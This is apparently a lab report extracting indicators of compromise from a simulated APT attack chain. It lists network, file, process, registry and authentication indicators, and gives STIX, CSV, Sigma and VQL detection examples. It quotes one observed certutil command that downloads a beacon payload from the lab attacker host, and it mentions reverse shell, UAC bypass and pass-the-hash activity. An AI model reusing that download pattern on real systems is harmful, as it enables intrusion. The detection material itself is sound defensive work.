# Indicator of Compromise (IOC) Extraction – APT Attack Chain Simulation

This document details the extraction and documentation of Indicators of Compromise (IOCs) identified during the APT attack chain simulation. These indicators can be used for threat hunting, SIEM detection, incident response, and forensic investigations.

---

# 1. IOC Extraction Workflow

| Step | Action | Tools Used |
|------|--------|------------|
| 1 | Collect Windows Security and Sysmon logs | Winlogbeat, Velociraptor |
| 2 | Review suspicious activity | Kibana Discover, Timeline |
| 3 | Extract unique indicators | PowerShell, jq, manual analysis |
| 4 | Validate against expected lab activity | Analyst review |
| 5 | Export and document indicators | JSON, CSV, STIX, Markdown |

---

# 2. Network Indicators

| Type | Value | Direction | Phase |
|------|-------|-----------|-------|
| IPv4 Address | `192.168.1.5` | Source/Destination | Attacker Infrastructure |
| TCP Port | `4444` | WS1 → Kali | Reverse Shell |
| TCP Port | `8080` | Kali → Victim | Payload Download |
| TCP Port | `8081` | DC → Kali | HTTP Beacon |
| TCP Port | `445` | Kali → DC | SMB Lateral Movement |
| Authentication | `NTLM` | Network | Pass-the-Hash |

---

# 3. File Indicators

| File Path | Host | Description |
|-----------|------|-------------|
| `C:\Users\Public\shell.exe` | WS1 | Reverse shell payload |
| `C:\Users\Public\beacon.exe` | DC | HTTP beacon payload |
| `C:\Windows\Temp\PSEXESVC.exe` | DC | PsExec service executable |
| `/tmp/shell.exe` | Kali | Payload copy |
| `/tmp/beacon.exe` | Kali | Beacon copy |
| `/tmp/hash.txt` | Kali | Extracted credential data |

> **Note:** File hashes were not collected during this simulation. In production, calculate SHA-256 or MD5 values using `Get-FileHash` or `sha256sum`.

---

# 4. Process Indicators

| Process | Parent | Host | Description |
|----------|---------|------|-------------|
| `shell.exe` | `cmd.exe` | WS1 | Initial payload |
| `beacon.exe` | `cmd.exe` | DC | HTTP C2 payload |
| `certutil.exe` | `cmd.exe` | DC | Payload downloader |
| `PSEXESVC.exe` | `services.exe` | DC | PsExec service |
| `eventvwr.exe` | `cmd.exe` | WS1 | UAC bypass activity |

Example command observed:

```text
certutil -urlcache -f http://192.168.1.5:8080/beacon.exe C:\Users\Public\beacon.exe
```

---

# 5. Scheduled Task Indicator

| Task Name | Trigger | Action | Host |
|-----------|----------|------------------------------|------|
| `Updater` | Daily 09:00 | `C:\Users\Public\shell.exe` | WS1 |

---

# 6. Registry Indicators

| Registry Key | Value |
|--------------|-------|
| `HKLM\SYSTEM\CurrentControlSet\Services\PSEXESVC` | `%SystemRoot%\Temp\PSEXESVC.exe` |
| `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks\{GUID}\Actions` | `C:\Users\Public\shell.exe` |

---

# 7. Authentication Indicators

| Field | Value |
|--------|-------|
| Source IP | `192.168.1.5` |
| Target Domain | `NATION` |
| Username | `Administrator` |
| Logon Type | `3` |
| Authentication Package | `NTLM` |

---

# 8. Credential Indicator

| User | Domain | Example NTLM Hash |
|------|--------|-------------------|
| `Administrator` | `NATION` | `2906d851e56454c1a699b58709c46497` |

> Replace the example hash with the actual value collected during your investigation.

---

# 9. Windows Event ID Indicators

| Event ID | Source | Description |
|----------|--------|-------------|
| 4688 | Security | Process creation |
| 4698 | Security | Scheduled task creation |
| 4624 | Security | Successful network logon |
| 4672 | Security | Administrative privileges assigned |
| 4663 | Security | LSASS object access |
| 5140 | Security | Network share access |
| 5145 | Security | Detailed share access |
| 7045 | System | Service installation |
| 7036 | System | Service started |
| 3 | Sysmon | Network connection |
| 10 | Sysmon | Process access |
| 11 | Sysmon | File creation |

---

# 10. STIX 2.1 Example

```json
{
  "type": "indicator",
  "spec_version": "2.1",
  "id": "indicator--example",
  "name": "Malicious Attacker IP",
  "pattern": "[ipv4-addr:value = '192.168.1.5']",
  "pattern_type": "stix",
  "valid_from": "2026-06-10T06:00:00Z"
}
```

---

# 11. CSV Example

```csv
Type,Value,Description
IPv4,192.168.1.5,Attacker IP
File,C:\Users\Public\shell.exe,Reverse shell payload
File,C:\Users\Public\beacon.exe,HTTP beacon payload
Process,shell.exe,Malicious executable
Process,beacon.exe,Malicious executable
Task,Updater,Scheduled task persistence
```

---

# 12. Sigma Rule Example

```yaml
title: Detect Suspicious Payload Execution

detection:
  selection:
    EventID: 4688
    ProcessName|endswith:
      - '\shell.exe'
      - '\beacon.exe'

  condition: selection
```

---

# 13. IOC Validation

| IOC | False Positive Risk | Validation Method |
|------|--------------------|------------------|
| `192.168.1.5` | Very Low | Verify ownership |
| `C:\Users\Public\shell.exe` | Very Low | Confirm execution path |
| `Updater` task | Medium | Check associated action |
| NTLM authentication | Medium | Correlate source IP |
| `certutil -urlcache` | Medium | Review destination URL |

---

# 14. Example Automation

## PowerShell

```powershell
Get-FileHash C:\Users\Public\shell.exe -Algorithm SHA256

Get-FileHash C:\Users\Public\beacon.exe -Algorithm SHA256

schtasks /query /fo LIST | Select-String "Updater"

Get-WinEvent -FilterHashtable @{LogName='Security';ID=4624}
```

## Velociraptor VQL

```sql
SELECT *
FROM hunt_results()
WHERE Exe =~ "(?i)(shell|beacon)\\.exe$"
```

---

# 15. IOC Storage

Store extracted indicators in:

- `ioc-list.md`
- `ioc-list.csv`
- `ioc-list.json`
- `ioc-list.stix.json`

Keep supporting evidence such as logs, screenshots, and exported hunt results alongside these files.

---

# 16. Lessons Learned

- Compute cryptographic hashes whenever possible.
- Behavioural indicators are generally more resilient than filenames.
- Parent-child process relationships improve detection accuracy.
- Correlating process, network, and authentication events reduces false positives.
- Regularly review and update IOC lists based on new findings.

---

# 17. Conclusion

The extracted Indicators of Compromise provide a structured representation of malicious activity observed during the simulated APT attack chain. These IOCs can be integrated into SIEM platforms, EDR solutions, and threat intelligence repositories to improve detection, hunting, and incident response capabilities.